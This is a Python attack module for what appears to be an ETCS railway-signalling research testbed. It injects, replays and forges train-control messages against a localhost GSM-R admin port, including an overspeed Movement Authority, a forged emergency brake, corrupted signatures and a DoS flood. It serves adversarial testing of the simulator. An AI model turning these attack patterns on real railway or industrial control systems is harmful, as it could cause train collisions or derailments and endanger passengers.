"""Attack framework for ETCS testbed.

Provides common attack patterns and utilities for adversarial testing
of ICS protocols in the ETCS testbed.
"""

import socket
import time
from typing import Any, Dict, Optional

from protocols.base import Protocol
from protocols.registry import get_protocol


class AttackFramework:
    """Framework for executing attacks against ETCS testbed."""
    
    def __init__(self, target_host: str = "127.0.0.1", target_port: int = 9100):
        """Initialize attack framework.
        
        Args:
            target_host: Target host (default: GSM-R admin interface)
            target_port: Target port (default: 9100 for GSM-R admin)
        """
        self.target_host = target_host
        self.target_port = target_port
    
    def inject_message(self, data: bytes, protocol: str = "json") -> bool:
        """Inject raw message towards train via GSM-R admin interface.
        
        Args:
            data: Raw message bytes to inject
            protocol: Protocol name (for logging)
            
        Returns:
            True if injection succeeded, False otherwise
        """
        try:
            with socket.create_connection((self.target_host, self.target_port), timeout=2.0) as s:
                s.sendall(data)
                return True
        except OSError as e:
            print(f"[ATTACK] Failed to inject message: {e}")
            return False
    
    def replay_attack(self, captured_data: bytes, delay: float = 0.0) -> bool:
        """Replay a previously captured message.
        
        Args:
            captured_data: Previously captured message bytes
            delay: Delay before replaying (seconds)
            
        Returns:
            True if replay succeeded
        """
        if delay > 0:
            time.sleep(delay)
        
        print(f"[ATTACK] Replaying captured message: {captured_data!r}")
        return self.inject_message(captured_data)
    
    def forge_message(self, payload: Dict[str, Any], protocol_name: str = "json",
                     key: Optional[bytes] = None, invalid_signature: bool = False) -> bool:
        """Forge and inject a message with optional invalid signature.
        
        Args:
            payload: Message payload to forge
            protocol_name: Protocol to use for encoding
            key: Signing key (None for unsigned)
            invalid_signature: If True, deliberately corrupt the signature
            
        Returns:
            True if injection succeeded
        """
        proto = get_protocol(protocol_name, key=key)
        
        # Encode message
        data = proto.encode(payload)
        
        # Corrupt signature if requested
        if invalid_signature and key is not None:
            # Replace signature with bogus value
            if protocol_name == "json":
                # For JSON, replace signature in the encoded message
                data = data.replace(b'"signature":', b'"signature": "00deadbeef",')
        
        print(f"[ATTACK] Forging {protocol_name} message: {payload}")
        return self.inject_message(data, protocol=protocol_name)
    
    def overspeed_attack(self, speed_limit: float = 300.0, position_km: float = 1.0,
                        next_checkpoint_km: float = 10.0, protocol: str = "json") -> bool:
        """Inject Movement Authority with dangerously high speed limit.
        
        Args:
            speed_limit: Target speed limit (km/h)
            position_km: Current position
            next_checkpoint_km: Next checkpoint
            protocol: Protocol to use
            
        Returns:
            True if attack succeeded
        """
        payload = {
            "type": "MA",
            "ma_id": int(time.time() * 1000) % 65536,
            "position_km": float(position_km),
            "next_checkpoint_km": float(next_checkpoint_km),
            "speed_limit": float(speed_limit),
            "message": "OVERSPEED_ATTACK",
        }
        
        print(f"[ATTACK] Overspeed attack: {speed_limit} km/h")
        return self.forge_message(payload, protocol_name=protocol, invalid_signature=True)
    
    def emergency_brake_attack(self, position_km: float = 1.0, protocol: str = "json") -> bool:
        """Inject emergency brake command.
        
        Args:
            position_km: Current position
            protocol: Protocol to use
            
        Returns:
            True if attack succeeded
        """
        payload = {
            "type": "EMERGENCY_UPDATE",
            "ma_id": int(time.time() * 1000) % 65536,
            "position_km": float(position_km),
            "next_checkpoint_km": float(position_km + 0.1),
            "speed_limit": 0.0,
            "message": "EMERGENCY_BRAKE_ATTACK",
        }
        
        print("[ATTACK] Emergency brake attack")
        return self.forge_message(payload, protocol_name=protocol, invalid_signature=True)
    
    def dos_flood(self, duration: float = 10.0, rate: int = 100,
                  target_port: Optional[int] = None) -> int:
        """Flood target with garbage data (DoS attack).
        
        Args:
            duration: Attack duration (seconds)
            rate: Messages per second
            target_port: Target port override (default: use configured port)
            
        Returns:
            Number of messages sent
        """
        port = target_port or self.target_port
        count = 0
        start = time.time()
        
        print(f"[ATTACK] DoS flood: {rate} msg/s for {duration}s on port {port}")
        
        while time.time() - start < duration:
            try:
                with socket.create_connection((self.target_host, port), timeout=0.5) as s:
                    s.sendall(b"GARBAGE" * 100 + b"\n")
                    count += 1
            except OSError:
                pass
            
            time.sleep(1.0 / rate)
        
        print(f"[ATTACK] DoS flood complete: {count} messages sent")
        return count


def demonstrate_attacks():
    """Demonstrate common attack scenarios."""
    print("=== ETCS Testbed Attack Demonstration ===\n")
    
    atk = AttackFramework()
    
    print("1. Overspeed Attack (JSON)")
    atk.overspeed_attack(speed_limit=250.0, protocol="json")
    time.sleep(2)
    
    print("\n2. Emergency Brake Attack (JSON)")
    atk.emergency_brake_attack(protocol="json")
    time.sleep(2)
    
    print("\n3. Forged MA with Invalid Signature")
    payload = {
        "type": "MA",
        "ma_id": 999,
        "position_km": 2.0,
        "next_checkpoint_km": 5.0,
        "speed_limit": 150.0,
        "message": "FORGED_MA",
    }
    atk.forge_message(payload, invalid_signature=True)
    
    print("\n=== Demonstration Complete ===")


if __name__ == "__main__":
    demonstrate_attacks()
